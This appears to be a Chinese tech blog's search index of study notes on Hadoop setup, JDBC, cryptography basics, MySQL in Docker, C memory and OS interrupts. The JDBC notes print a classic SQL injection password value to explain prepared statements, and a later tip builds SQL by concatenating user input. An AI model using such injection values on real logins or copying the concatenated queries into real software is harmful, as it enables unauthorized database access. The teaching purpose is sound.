\u0026lt;name\u0026gt;dfs.client.block.write.replace-datanode-on-failure.enable\u0026lt;/name\u0026gt; \u0026lt;value\u0026gt;true\u0026lt;/value\u0026gt; \u0026lt;/property\u0026gt; kali内直接安装hadoop\u003e kali内直接安装hadoop # 官网下载hadoop-3.2.0.tar.gz\n将文件解压到/opt/module/hadoop-3.2.0/\ntar -zxvf hadoop-3.2.0.tar.gz -C /opt/module/\n这里试过解压到/home/kali/Downloads下，最后的hadoop只能在特定目录下使用不能全局使用，因此就改回了/opt/module\n配置环境变量\nvim ~/.local_profile\nvim /etc/profile\nvim ~/.zshrc\nvim ~/.bashrc\ncd /etc/profile.d\n为什么可以在这里面配置环境？而不是/etc/profile\n查看shell脚本可以发现，它循环遍历profile.d里所有.sh后缀的文件，将其作为环境变量。\nvim my_env.sh 没有文件会新建\n修改文件内容\n#HADOOP_HOME export HADOOP_HOME=/opt/module/hadoop-3.2.0 export PATH=$PATH:$HADOOP_HOME/bin export PATH=$PATH:$HADOOP_HOME/sbin #JAVA_HOME #java的位置可以使用命令where java 查看，根据实际情况修改 export JAVA_HOME=/opt/jdk1.8.0_191 export PATH=$PATH:$JAVA_HOME/bin 使配置文件生效\nsource /etc/profile\nsource ~/.zshrc\n测试，使用命令hadoop\n​\t若没有多出来一个#符号则成功 bin 存放命令\nhdfs 存储\nmapred 计算\nyarn 资源调度\n/etc/hadoop\ninclude 类似于头文件\n./lib/native本地动态连接库\nsbin\nshare 学习资料，包括文档和官方案例\n官方样例\n","date":"2022-01-07","permalink":"/docs/%E5%A4%A7%E6%95%B0%E6%8D%AE/","section":"Docs","summary":"集群配置\u003e 集群配置 # kali+docker\n选择一个目录存放git clone的目录，克隆项目\n项目克隆前需要换源以及git ssh配置\ncd ~/clonprj\ngit clone git@github.com:big-data-europe/docker-hadoop.git\ncat docker-compose.yml 查看资源清单\nversion: \u0026#34;3\u0026#34; services: namenode: image: bde2020/hadoop-namenode:2.0.0-hadoop3.2.1-java8 container_name: namenode restart: always ports: - 9870:9870 - 9000:9000 volumes: - hadoop_namenode:/hadoop/dfs/name environment: - CLUSTER_NAME=test env_file: - .","title":"大数据基本配置和使用"},{"content":"饿了么项目总结\u003e 饿了么项目总结 # jdbc学习\n注册驱动\n告诉java程序即将连接哪个品牌的数据库 使用了资源绑定器绑定属性配置文件bundle.getString(\u0026ldquo;DRIVER\u0026rdquo;); 获取连接\n表示JVM的进程和数据库进程之间的通道打开了，属于进程之间的通信。消耗大，使用完必须关闭 获取数据库对象\n执行SQL\n有两种方法：statement和preparedstatement\npreparedstatement statement 编译一次执行多次，效率更高 编译一次执行一次 解决SQL注入问题 存在SQL注入问题 会在编译阶段做类型的安全检查 大多数情况都用预编译 需要进行SQL语句拼接的时候才用（例如：商城的升序和降序） SQL注入\nsql语句： select * from user where loginName = '\u0026quot;+loginName+\u0026quot;' and loginPwd = '\u0026quot;+loginPwd+\u0026quot;'\n用户名： fdss\n密码：fdss\u0026rsquo; or \u0026lsquo;1\u0026rsquo;=\u0026lsquo;1\n在多条件模糊查询的时候，如何确定SQL语句\n就是在查询商家的时候可以按商家名称也可以按地址查询，这两种SQL语句怎么确定？\nstring和StringBuffer的选择\n处理查询\n不同的SQL语句查询方法不一样\n在jdbc中3种执行sql的语句execute，executeQuery和executeUpdate的区别？\nexecute执行增删改查操作 execute返回的结果是个boolean型，当返回的是true的时候，表明有ResultSet结果集，通常是执行了select操作，当返回的是false时，通常是执行了insert、update、delete等操作。execute通常用于执行不明确的sql语句。\nexecuteQuery执行查询操作 executeQuery返回的是ResultSet结果集，通常是执行了select操作。\nexecuteUpdate执行增删改操作 executeUpdate返回的是int型，表明受影响的行数，通常是执行了insert、update、delete等操作。\n释放连接\n命名规范\ndao po view 分层设计\n","date":"2022-01-07","permalink":"/posts/%E9%A5%BF%E4%BA%86%E4%B9%88%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/","section":"文章列表","summary":"饿了么项目总结\u003e 饿了么项目总结 # jdbc学习\n注册驱动\n告诉java程序即将连接哪个品牌的数据库 使用了资源绑定器绑定属性配置文件bundle.getString(\u0026ldquo;DRIVER\u0026rdquo;); 获取连接\n表示JVM的进程和数据库进程之间的通道打开了，属于进程之间的通信。消耗大，使用完必须关闭 获取数据库对象\n执行SQL\n有两种方法：statement和preparedstatement\npreparedstatement statement 编译一次执行多次，效率更高 编译一次执行一次 解决SQL注入问题 存在SQL注入问题 会在编译阶段做类型的安全检查 大多数情况都用预编译 需要进行SQL语句拼接的时候才用（例如：商城的升序和降序） SQL注入\nsql语句： select * from user where loginName = '\u0026quot;+loginName+\u0026quot;' and loginPwd = '\u0026quot;+loginPwd+\u0026quot;'","title":"饿了么项目总结"},{"content":"","date":"2022-01-07","permalink":"/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/","section":"Tags","summary":"","title":"密码学"},{"content":"1. 绪论\u003e 1. 绪论 # 任何需要可信的第三方的计算，都可以舍弃第三方\n1.1 Security Objectives\u003e 1.1 Security Objectives # 保密性 Confidentiality\n信息的非授权泄露\n数据保密性 Data confidentiality\n确保自己的隐私信息不在未授权的情况下透露给他人。\n隐私性 Privacy\n确保自己的隐私能够被自己控制，如：向谁授权，让其获得这些隐私。\n完整性 Integrity\n信息的非授权更改和毁坏\n数据完整性 Data integrity\n确保信息和程序只能以特定和授权的方式进行更改，避免信息的不恰当更改或破坏。\n包括了信息的不可否认性和真实性。\n系统完整性 System integrity\n确保系统能正常的执行预定的功能，避免非授权操纵。\n可用性 Availability\n确保系统工作讯息，避免信息系统访问和使用的中断，对授权用户不能拒绝服务。\n真实性 Authenticity\n验证用户是否是他声称的那个人。\n验证系统的每个输入是否来自可信任的源。\n可追溯性 Accountability\n当出现安全事故时，我们必须能够追查到责任人。\n1.2 OSI安全框架\u003e 1.2 OSI安全框架 # 安全攻击 Security attack\n任何危及信息系统安全的行为。\n被动攻击\n被动攻击不涉及流量的修改，难以检测，因此应该把重点放在预防上。\n① 信息泄露 The release of message contents\n② 流量分析 Traffic analysis\n经过加密保护的信息还是具有消息模式的特点，攻击者可以根据传输消息的频率和长度来获取某些信息。\n主动攻击\n对数据流进行修改和伪造\n① 伪装 Masquerade\n伪装别的实体。能够做到没有权限的实体冒充有权限的实体从而获取权限。\n② 重播 Replay\n源主机或者攻击者将获得的信息再次发送，可达到欺骗系统的目的，主要用于身份认证过程，破坏认证的正确性。\n③ 消息修改 Data Modification\n修改合法消息的内容、延迟信息传输、更改消息的顺序。\n④ 拒绝服务 Denial of service\n向服务器发送大量数据，使其崩溃。\n安全机制 Security mechanisms\n加密 Cryptographic algorithms\n无密钥加密算法 Keyless Algorithms\n对一段信息的摘要\n① hash函数\n② 伪随机数\n单密钥\\对称密钥加密算法 Single-Key \\Asymmetric Algorithms\n① 分组\\块密码 Block cipher\n转换不仅依赖于当前数据块和密钥，而且还依赖于前面块的内容\n② 流密码 Stream cipher\n转换依赖于密钥\n③ 消息认证码 Message Authentication Code (MAC)\n将通信双方共享的密钥K和消息m作为输入，生成一个关于K和m的函数值MAC，将其作为认证标记(Tag)。发送时，将消息和认证码同时发送给接收方，若接收方用消息和共享密钥生成相同的消息认证码，则认证通过。\n双密钥\\非对称加密算法 Two-Key\\Asymmetric Algorithms\n① 数字签名算法 Digital signature algorithm\n② 密钥交换 Key exchange\n③ 用户认证 User authentication\n数字签名 Digital signature\n访问控制 Access control\n数据完整性 Data integrity\n认证交换 Authentication exchange\n通过信息交换来保证实体身份\n流量填充 Traffic padding\n在数据流中插入若干位组织流量分析\n路由控制 Routing control\n为某些数据选择安全的物理线路并允许路由变化\n公证 Notarization\n安全服务 Security service\n认证 Authentication\n① 对等实体认证 Peer entity authentication\n在连接建立和数据传输的阶段，确认连接的双方没有假冒的。\n② 数据源认证 Data origin authentication\n仅确保数据来源，不提供其他保护机制，如：数据修改。这样的认证常用于电子邮件等应用，通信实体事先并无交互。\n访问控制 Access Control\n阻止对资源的非授权使用，每个实体或用户都对某个资源具有不同的权限，因此在使用资源之前需要认证身份，然后才能授权。\n数据保密性 Data Confidentiality\n防止数据遭到被动攻击\n连接保密性：保护一次连接中所有用户的信息\n无连接保密性：保护单个数据块里所有用户的信息\n选择域保密性：保护单条信息或单条信息里指定的数据部分\n流量保密性：防止流量分析\n数据完整性 Data Integrity\n提供的服务分为有连接和无连接、具有恢复功能和无恢复功能\n不可否认性 Nonrepudiation\n可用性服务 Availability Service\n安全服务和机制间的联系\n1.3 网络安全关键因素\u003e 1.3 网络安全关键因素 # 通信安全\n借助安全协议，如SSH、HTTPS等。\n服务安全\n保护安全设备，如：路由、交换机等。\n几种安全设备：\n① 防火墙 Firewall\n防火墙作为一个过滤器，基于一组基于流量内容和/或流量模式的规则，允许或拒绝数据传入和传出流量。\n② 入侵检测 Intrusion detection\n发出警报但不做出制止行为\n③ 入侵防护 Intrusion prevention\n在入侵前检测并拦截入侵行为\n2. 传统加密技术\u003e 2. 传统加密技术 # 2.1 对称密码模型\u003e 2.1 对称密码模型 # 明文 Messege\\X 加密算法 Encrypt 密钥 Key 密文 Cyphertext\\Y 解密算法 Decrypt $$ c=E(k,m) \\ m=D(k,c)\\ D(k,E(k,m))=m\\ $$\n2.1.1 密码编码学\u003e 2.1.1 密码编码学 # 密码编码学系统有以下3个独立的特征：\n转换明文密文的运算类型\n代替和置换\n所用的密钥数\n处理明文的方法\n2.1.2 密码分析学和穷举攻击\u003e 2.1.2 密码分析学和穷举攻击 # 密码分析学\n唯密文攻击、已知明文攻击、选择明文攻击、选择密文攻击、选择文本攻击\n无条件安全\n无论有多少可使用的密文，都不足以唯一地确定密文所对应的明文，则称该加密体制是无条件安全的。\n计算上安全的算法的标准\n① 破译密码的代价超过密文信息的价值；\n② 破译密码的时间超过密码的有效生命期。\n穷举攻击\n2.2 代替技术\u003e 2.2 代替技术 # 2.2.1 Caesar密码\u003e 2.2.1 Caesar密码 # 字母表移位 密钥空间25 明文易于识别 2.2.2 单表代替密码\u003e 2.2.2 单表代替密码 # 密文行是26个字母的任意替换 密钥空间 26! 明文可以被字频分析，词频破解 2.2.3 多字母代替算法 Playfair密码\u003e 2.2.3 多字母代替算法 Playfair密码 # 以一个密钥词（monarchy）以及剩余字母，填充矩阵格子，每两个字母加密一次，在相同的字母之间加一个填充字母。\nM O N A R C H Y B D E F G I/J K L P Q S T U V W X Z 密钥空间26*26=676\n词频破解\n2.2.4 多表代替密码 HIll密码\u003e 2.2.4 多表代替密码 HIll密码 # 2.2.5 多表代替加密\u003e 2.2.5 多表代替加密 # Vigenere 密码\n密钥是一个密钥词的重复 明文 H e l l o w o r l d 密钥 a b c a b c a b c a 密文 H f n l p y o s n d 即使有如此算力能够穷举出来也没办法根据明文信息判断哪一句是真正的明文，因为会有很多句都有具体的意义\n发现重复的密文序列，可以推算出密钥长度\nVernam 密码\n基于二进制数据而非字母，使用异或加密 使用周期很大的循环密钥 如果有足够的密文，使用已知明文序列，可以被破解 2.2.6 一次一密\u003e 2.2.6 一次一密 # 一次性密码本，明文长度和密钥一样长 该方法完全安全 密码太长，难以保护 2.3 置换技术\u003e 2.3 置换技术 # 加密方法\n按对角线的顺序写出明文（栅栏技术）\n明文：meet me\n密文：\nm\te\tm e\tt\te 将消息一行一行地写成矩形块，把列的顺序打乱，列的次序就是密钥（置换密码）\n一次加密可以很容易单个字母词频攻击，可以多次加密，这样分析难度大得多\n密钥 2 1 3 明文 M E E T M E 密文 EM MT EE 2.4 转轮机\u003e 2.4 转轮机 # 使用n个轮子密钥长度就是替换过n次的Vigenere密码 $$ 26^n $$\n2.5 隐写术\u003e 2.5 隐写术 # 应用于通信双方宁愿丢失，也不愿他们进行密码通信的事实被人发现\n密码学的三个步骤 精确指定威胁模型，例如：攻击者如何攻击数字签名，伪造签名的目的何在？ 提出架构。证明任何攻击者在这个威胁模型下可以攻击这个架构的这个攻击者也可以用来解决根本性难题。 如果能够在威胁模型下攻击该架构，那么他可以解决世纪难题。进而反推他无法成功攻击该架构。 发展史 替换式密码 凯撒加密（词频破解、字母配对频率） vigener （用一个单词作为密钥） 滚轮机器（用碟片） 英语单词\u003e 英语单词 # Security Objectives 网络安全的目标 ","date":"2022-01-07","permalink":"/docs/%E5%AF%86%E7%A0%81%E5%AD%A6/","section":"Docs","summary":"1. 绪论\u003e 1. 绪论 # 任何需要可信的第三方的计算，都可以舍弃第三方\n1.1 Security Objectives\u003e 1.1 Security Objectives # 保密性 Confidentiality\n信息的非授权泄露\n数据保密性 Data confidentiality\n确保自己的隐私信息不在未授权的情况下透露给他人。\n隐私性 Privacy\n确保自己的隐私能够被自己控制，如：向谁授权，让其获得这些隐私。\n完整性 Integrity\n信息的非授权更改和毁坏\n数据完整性 Data integrity\n确保信息和程序只能以特定和授权的方式进行更改，避免信息的不恰当更改或破坏。","title":"密码学学习笔记"},{"content":"","date":"2021-01-07","permalink":"/tags/mysql/","section":"Tags","summary":"","title":"mysql"},{"content":" 版本8.0.19\n安装命令\ndocker run -p 3306:3306 --name mysql \\-v /mydata/mysql/log:/var/log/mysql \\-v /mydata/mysql/conf/my.cnf:/etc/mysql/my.cnf \\-v /mydata/mysql/data:/var/lib/mysql \\-e MYSQL_ROOT_PASSWORD=root \\-d mysql:8.0.19 命令\ndocker exec -it mysqlone /bin/bash ","date":"2021-01-07","permalink":"/posts/mysql+docker/","section":"文章列表","summary":" 版本8.0.19\n安装命令\ndocker run -p 3306:3306 --name mysql \\-v /mydata/mysql/log:/var/log/mysql \\-v /mydata/mysql/conf/my.cnf:/etc/mysql/my.cnf \\-v /mydata/mysql/data:/var/lib/mysql \\-e MYSQL_ROOT_PASSWORD=root \\-d mysql:8.0.19 命令\ndocker exec -it mysqlone /bin/bash ","title":"Mysql+docker"},{"content":"可以借助sys.stdin.readline() sys.stdin.read() sys.stdin.readlines()\n也可以直接用input()实现交互\n坑点：在读的时候必须以只读的方式打开，图一是错误的，图二才能正确读出数据\n事实上，图二之所以能够读出数据，是因为指针偏移量重置为0了，在图一的flush后加上seek(0)即可，如图三\n使用with语句改进：\nimport sys import random with open(\u0026#34;in.txt\u0026#34;,\u0026#39;w+\u0026#39;,encoding=\u0026#39;utf8\u0026#39;) as f: sys.stdin = f f.write(\u0026#34;55\u0026#34;) f.flush() f.seek(0) line = sys.stdin.readline() count = 0 while True: print(random.randint(0, int(line))) count += 1 if count == 50: break ","date":"2021-01-07","permalink":"/posts/%E6%8A%8A%E6%96%87%E4%BB%B6%E8%AE%BE%E4%B8%BAstdin%E5%90%8E%E5%A6%82%E4%BD%95%E8%AF%BB%E6%95%B0%E6%8D%AE/","section":"文章列表","summary":"可以借助sys.stdin.readline() sys.stdin.read() sys.stdin.readlines()\n也可以直接用input()实现交互\n坑点：在读的时候必须以只读的方式打开，图一是错误的，图二才能正确读出数据\n事实上，图二之所以能够读出数据，是因为指针偏移量重置为0了，在图一的flush后加上seek(0)即可，如图三\n使用with语句改进：\nimport sys import random with open(\u0026#34;in.txt\u0026#34;,\u0026#39;w+\u0026#39;,encoding=\u0026#39;utf8\u0026#39;) as f: sys.stdin = f f.write(\u0026#34;55\u0026#34;) f.flush() f.seek(0) line = sys.stdin.readline() count = 0 while True: print(random.randint(0, int(line))) count += 1 if count == 50: break ","title":"把文件设为stdin后如何读数据"},{"content":"","date":"2021-01-07","permalink":"/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/","section":"Tags","summary":"","title":"数据库"},{"content":"","date":"2021-01-03","permalink":"/docs/","section":"Docs","summary":"","title":"docs"},{"content":"","date":"2021-01-03","permalink":"/tags/%E5%86%85%E5%AD%98/","section":"Tags","summary":"","title":"内存"},{"content":"数组越界问题\u003e 数组越界问题 # int main(int argc, char* argv[]){ int i = 0; int arr[3] = {0}; for(; i\u0026lt;=3; i++){ arr[i] = 0; printf(\u0026#34;hello world\\n\u0026#34;); } return 0; } 疑问：这段代码的运行结果理论上是无限打印，实际上VS编译器中只打印了四次。\n在 C 语言中，只要不是访问受限的内存，所有的内存空间都是可以自由访问的。根据我们前面讲的数组寻址公式，a[3]也会被定位到某块不属于数组的内存地址上，而这个地址正好是存储变量 i 的内存地址，那么 a[3]=0 就相当于 i=0，所以就会导致代码无限循环。\n那么，为什么\u0026amp;arr[3]=\u0026amp;i呢？\n因为，函数体内的局部变量存在栈上，而且是连续压栈。在Linux进程的内存布局中，栈区在高地址，且从高向低增长，那么实际上arr和i在内存中的状态如下表所示。\narr[0] arr[1] arr[2] i 什么时候使用数组而不使用ArrayList等容器\u003e 什么时候使用数组而不使用ArrayList等容器 # 需要存储基本类型 对性能要求较高 需要表达多维时，数组比较直观 数据大小事先已知且操作简单 在多条件模糊查询的时候，如何确定SQL语句（实战技巧）\u003e 在多条件模糊查询的时候，如何确定SQL语句（实战技巧） # 如图，在这\u0026quot;businessAddress like '%\u0026quot;+businessAddress+\u0026quot;%'\u0026quot;句之前是否需要加and？\n解决：利用永真式1=1\nString sql = \u0026#34;select * from business where 1=1 \u0026#34;; if (businessName!=null\u0026amp;\u0026amp;!businessName.equals(\u0026#34;\u0026#34;)){//判断字符串是否为空 sql += \u0026#34;and businessName like \u0026#39;%\u0026#34;+businessName+\u0026#34;%\u0026#39;\u0026#34;; } if (businessAddress!=null\u0026amp;\u0026amp;!businessAddress.equals(\u0026#34;\u0026#34;)){//判断字符串是否为空 sql += \u0026#34;and businessAddress like \u0026#39;%\u0026#34;+businessAddress+\u0026#34;%\u0026#39;\u0026#34;; } String和StringBuffer的选用\u003e String和StringBuffer的选用 # String的字符串对象是字符串常量池里的，如果需要频繁的连接和改动的话，会导致很多不用的字符串常量被废弃\n此时，选用StringBuffer效率更高\nSQL查询\u003e SQL查询 # where写布尔表达式的注意事项\u003e where写布尔表达式的注意事项 # 找出与“Smith”居住在同一城市、同一街道的所有客户的名字。\n--正确 SELECT customer_name FROM customer WHERE Customer_street IN ( SELECT Customer_street FROM customer WHERE Customer_name = \u0026#39;Smith\u0026#39; ) AND Customer_city IN ( SELECT Customer_city FROM customer WHERE Customer_name = \u0026#39;Smith\u0026#39; ); --错误 where后并列查询不可以直接用逗号表示，用and Select customer_name from customer where Customer_street, Customer_city in ( select Customer_street, Customer_city from customer where Customer_name=’ Smith’ ); 操作系统\u003e 操作系统 # “访管”指令仅在用户态下使用，执行“访管”指令将用户态转变为核心态。因操作系统不允许用户直接执行某些“危险性高”的指令，因此用户态运行这些指令的结果会转成操作系统的核心态去运行。这个过程就是访管中断。\n中断处理流程的前三个步骤是由硬件直接实现（隐指令）的。地址映射中需要基地址（或页表）寄存器和地址加法器的支持。而在时钟管理中，需要硬件计数器保持时钟的运行。\n中断处理流程：\n中断请求\n每个中断源向CPU发出中断的时机是随机的； 内中断不能被屏蔽，外中断有可屏蔽和不可屏蔽之分 为了记录这些中断事件和区分不同的中断源，中断系统为每一个中断源设置了一个中断请求标志触发器。如果某个中断源发出了中断，就将相应的标志触发器置为1； 对于外中断，CPU统一在每条指令执行阶段结束前向中断控制器发出中断查询信号，去查询是否有中断请求要去处理。 中断判优先级\n如果有多个中断源发出了中断请求。则需要根据中断优先级选择优先级高的中断请求先进行响应 中断默认优先级是由一个硬件排队器来实现的 但是中断屏蔽字可以动态改变中断优先级。 中断响应\nCPU向中断源发出中断响应信号 关中断 保存断电（PC） 找到中断服务的入口地址（中断向量） 中断服务\n保存现场：通用寄存器和状态寄存器和屏蔽字 开中断 中断处理过程 关中断 恢复现场 开中断 中断返回 中断返回\n回到断电处 恢复硬件 继续执行原程序 中断程序本身可能是用户程序，但是进入中断的处理程序一定是OS程序。若被中断的是用户程序，则系统将从目态转入管态，在管态下进行中断的处理；若被中断的是低级中断，则仍然保持在管态，而用户程序只能在目态下运行，因此进入中断处理的程序只能是OS程序。\n计算机通过硬件中断机制完成由用户态到核心态的转换，核心态到用户态的转换是由操作系统程序执行后完成的。\n广义指令只能在核心态执行，广义指令就是系统调用。要分清调用和执行的区别，调用可能在用户态，执行一定在核心态。\n特权用户程序能够执行特权指令，这句话是错的，只有操作系统程序可以。\n下列选项中，不可能在用户态发生的事件是（C）。\n系统调用 外部中断 进程切换 缺页 1.系统调用可能在用户态和内核态发生，系统调用把应用程序的请求（用户态的请求）传入内核，由内核（内核态）处理请求并将结果返回给应用程序（用户态） 用户态-\u0026gt;核心态\n2.中断的发生与CPU当前的状态无关，既可以发生在用户态，又可以发生在内核态，因为无论系统处于何种状态都需要处理外部设备发来的中断请求。\n3.进程切换在核心态下完成，不能发生在用户态。原因：需要调度处理器和系统资源，为保证系统安全?\n4.缺页（异常）也是用户态-\u0026gt;内核态\nABD（系统调用中断异常）都是用户态转向内核态，而进程切换只能发生在内核态\n所以选C进程切换\n中断处理要保存而子程序不用保存的数据是PSW。因为子程序调用只需保存程序断点，即该指令的下一条指令的地址：中断处理不仅要保存断点(PC的内容)，还要保存程序状态字寄存器(PSW)的内容。在中断处理中，最重要的两个寄存器是PC和PSW。\n整数除以0会触发异常，会使得进程从用户态转向核心态\n外部中断处理过程，PC值由中断隐指令自动保存，而通用寄存器内容由操作系统保存。\n从用户态到内核态，系统调用、中断、异常\n执行系统调用的过程如下：正在运行的进程先传递系统调用参数，然后由焰入(trap)指令负责将用户态转换为内核态，并将返回地址压入堆栈以备后用，接下来CPU执行相应的内核态服务程序，最后返回用户态。\n当CPU检测到中断信号后会做些什么？由硬件自动保存被中断程序的断点(即程序计数器PC)。之后，硬件找到该中断信号对应的中断向量，中断向量指明中断服务程序入口地址(各中断向量统一存放在中断向量表中，该表由操作系统初始化)。接下来开始执行中断服务程序，包括保存PSW、保存中断屏蔽字、保存各通用寄存器的值，并提供与中断信号对应的中断服务，中断服务程序属于操作系统内核。\n","date":"2021-01-03","permalink":"/docs/%E7%BB%86%E8%8A%82%E6%88%96%E6%8A%80%E5%B7%A7/","section":"Docs","summary":"数组越界问题\u003e 数组越界问题 # int main(int argc, char* argv[]){ int i = 0; int arr[3] = {0}; for(; i\u0026lt;=3; i++){ arr[i] = 0; printf(\u0026#34;hello world\\n\u0026#34;); } return 0; } 疑问：这段代码的运行结果理论上是无限打印，实际上VS编译器中只打印了四次。\n在 C 语言中，只要不是访问受限的内存，所有的内存空间都是可以自由访问的。根据我们前面讲的数组寻址公式，a[3]也会被定位到某块不属于数组的内存地址上，而这个地址正好是存储变量 i 的内存地址，那么 a[3]=0 就相当于 i=0，所以就会导致代码无限循环。","title":"细节或技巧"},{"content":"","date":"2020-11-03","permalink":"/tags/idea/","section":"Tags","summary":"","title":"idea"},{"content":"彻底删除idea项目\u003e 彻底删除idea项目 # remove module 手动删除文件夹 删除项目引用 使用Everything搜索找到 项目.contexts.zip和项目.tasks.zip两个文件，将其删除 idea快捷键\u003e idea快捷键 # 批量编辑 ：alt + shift+insert\n方法说明注释：输入/** ,点击“Enter”\n","date":"2020-11-03","permalink":"/docs/%E6%9D%82%E8%AE%B0/","section":"Docs","summary":"彻底删除idea项目\u003e 彻底删除idea项目 # remove module 手动删除文件夹 删除项目引用 使用Everything搜索找到 项目.contexts.zip和项目.tasks.zip两个文件，将其删除 idea快捷键\u003e idea快捷键 # 批量编辑 ：alt + shift+insert\n方法说明注释：输入/** ,点击“Enter”","title":"杂记"},{"content":"","date":"0001-01-01","permalink":"/authors/","section":"Authors","summary":"","title":"Authors"},{"content":"","date":"0001-01-01","permalink":"/categories/","section":"Categories","summary":"","title":"Categories"}]